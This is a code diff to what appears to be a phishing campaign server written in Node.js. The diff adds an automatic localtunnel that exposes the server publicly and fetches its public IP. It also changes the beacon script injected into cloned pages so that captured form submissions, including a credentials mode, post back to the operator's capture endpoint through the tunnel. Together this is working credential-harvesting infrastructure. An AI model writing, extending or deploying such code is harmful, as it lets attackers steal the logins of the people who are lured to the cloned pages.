@@ -7,6 +7,48 @@ const captures     = new Map()   // id     → Capture[]
 const slugMap      = new Map()   // slug   → campaignId
 const sseListeners = new Set()
 
+// ── Auto tunnel (localtunnel) ─────────────────────────────────────────────────
+
+let tunnelUrl    = ''
+let tunnelStatus = 'starting'  // 'starting' | 'connected' | 'error' | 'closed'
+let publicIp     = ''
+
+async function fetchPublicIp() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) })
+    const { ip } = await r.json()
+    publicIp = ip || ''
+  } catch { publicIp = '' }
+}
+
+async function startTunnel() {
+  try {
+    await fetchPublicIp()
+    // Dynamic import — localtunnel is CJS and may not be present on first run
+    const { default: localtunnel } = await import('localtunnel')
+    const lt = await localtunnel({ port: 3001 })
+    tunnelUrl    = lt.url
+    tunnelStatus = 'connected'
+    broadcast('tunnel', { url: tunnelUrl, status: 'connected', publicIp })
+
+    lt.on('close', () => {
+      tunnelUrl    = ''
+      tunnelStatus = 'closed'
+      broadcast('tunnel', { url: '', status: 'closed' })
+    })
+    lt.on('error', () => {
+      tunnelStatus = 'error'
+      broadcast('tunnel', { url: '', status: 'error' })
+    })
+  } catch {
+    tunnelStatus = 'error'
+    broadcast('tunnel', { url: '', status: 'error' })
+  }
+}
+
+// Start 2 s after module loads — server is guaranteed to be listening by then
+setTimeout(startTunnel, 2000)
+
 function genId(len = 4) {
   return randomBytes(len).toString('hex')
 }
@@ -143,13 +185,13 @@ function rewriteUrls(html, baseUrl) {
 // button/submit-click (catches React/Vue synthetic forms).
 
 function buildBeacon(campaignId, mode, redirectUrl) {
-  const cap   = `/api/phishing/capture/${campaignId}`
+  const cap   = `/api/phishing/capture/${campaignId}`   // path only — host resolved at runtime
   const creds = mode === 'credentials'
   const redir = (creds && redirectUrl?.trim()) ? JSON.stringify(redirectUrl.trim()) : 'null'
 
   /* eslint-disable */
   return `<script>(function(){
-var _u='${cap}',_r=${redir},_sent=false;
+var _u=location.origin+'${cap}',_r=${redir},_sent=false;
 function _post(p,cb){
   var b=JSON.stringify(p);
   try{
@@ -367,6 +409,12 @@ export function registerPhishingRoutes(app) {
     campaign.captureCount++
     broadcast('capture', capture)
   })
+
+  // ── Tunnel status ───────────────────────────────────────────────────────────
+  app.get('/api/phishing/tunnel', (_req, res) => {
+    res.json({ url: tunnelUrl, status: tunnelStatus, publicIp })
+  })
+
 
   // ── SSE stream ──────────────────────────────────────────────────────────────
   app.get('/api/phishing/stream', (req, res) => {
